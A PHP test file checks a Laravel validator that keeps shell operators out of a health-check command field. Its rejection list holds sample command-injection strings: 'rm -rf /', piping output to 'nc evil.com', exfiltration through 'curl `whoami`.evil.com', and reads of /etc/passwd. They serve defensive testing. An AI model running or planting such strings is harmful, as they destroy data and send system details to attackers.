<?php

use Illuminate\Support\Facades\Validator;

$commandRules = ['nullable', 'string', 'max:1000', 'regex:/^[a-zA-Z0-9 \-_.\/:=@,+]+$/'];

it('rejects healthCheckCommand over 1000 characters', function () use ($commandRules) {
    $validator = Validator::make(
        ['healthCheckCommand' => str_repeat('a', 1001)],
        ['healthCheckCommand' => $commandRules]
    );

    expect($validator->fails())->toBeTrue();
});

it('accepts healthCheckCommand under 1000 characters', function () use ($commandRules) {
    $validator = Validator::make(
        ['healthCheckCommand' => 'pg_isready -U postgres'],
        ['healthCheckCommand' => $commandRules]
    );

    expect($validator->fails())->toBeFalse();
});

it('accepts null healthCheckCommand', function () use ($commandRules) {
    $validator = Validator::make(
        ['healthCheckCommand' => null],
        ['healthCheckCommand' => $commandRules]
    );

    expect($validator->fails())->toBeFalse();
});

it('accepts simple commands', function ($command) use ($commandRules) {
    $validator = Validator::make(
        ['healthCheckCommand' => $command],
        ['healthCheckCommand' => $commandRules]
    );

    expect($validator->fails())->toBeFalse();
})->with([
    'pg_isready -U postgres',
    'redis-cli ping',
    'curl -f http://localhost:8080/health',
    'wget -q -O- http://localhost/health',
    'mysqladmin ping -h 127.0.0.1',
]);

it('rejects commands with shell operators', function ($command) use ($commandRules) {
    $validator = Validator::make(
        ['healthCheckCommand' => $command],
        ['healthCheckCommand' => $commandRules]
    );

    expect($validator->fails())->toBeTrue();
})->with([
    'pg_isready; rm -rf /',
    'redis-cli ping | nc evil.com 1234',
    'curl http://localhost && curl http://evil.com',
    'echo $(whoami)',
    'cat /etc/passwd > /tmp/out',
    'curl `whoami`.evil.com',
    'cmd & background',
    'echo "hello"',
    "echo 'hello'",
    'test < /etc/passwd',
    'bash -c {echo,pwned}',
    'curl http://evil.com#comment',
    'echo $HOME',
    "cmd\twith\ttabs",
    "cmd\nwith\nnewlines",
]);

it('rejects invalid healthCheckType', function () {
    $validator = Validator::make(
        ['healthCheckType' => 'exec'],
        ['healthCheckType' => 'string|in:http,cmd']
    );

    expect($validator->fails())->toBeTrue();
});

it('accepts valid healthCheckType values', function ($type) {
    $validator = Validator::make(
        ['healthCheckType' => $type],
        ['healthCheckType' => 'string|in:http,cmd']
    );

    expect($validator->fails())->toBeFalse();
})->with(['http', 'cmd']);
